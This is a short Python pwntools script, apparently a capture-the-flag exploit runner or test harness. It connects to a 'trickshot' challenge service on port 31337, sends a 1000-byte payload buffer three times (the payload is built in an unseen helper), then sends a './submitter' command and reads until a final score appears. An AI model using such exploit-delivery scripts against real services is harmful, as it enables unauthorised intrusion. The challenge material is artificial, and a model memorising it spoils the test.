#!/usr/bin/env python3

from pwn import *
import signal
from lib import get_buf
import os

def handler(signum, frame):
    log.info('timed out')
    exit(0)

signal.signal(signal.SIGALRM, handler)
signal.alarm(30)


HOST = os.environ.get('HOST', 'localhost')
PORT = 31337


io = remote(HOST, int(PORT))


log.info('start')
print(io.recvline_contains(b'Setting you up for a trickshot...'))
log.info('sending buf')
buf = get_buf()
assert len(buf) == 1000
io.sendline(buf * 3)
io.sendline(b'./submitter')
log.info('waiting')
while True:
    line = io.recvline()
    print(line)
    if 'Final score:' in line.decode():
        break
io.stream()
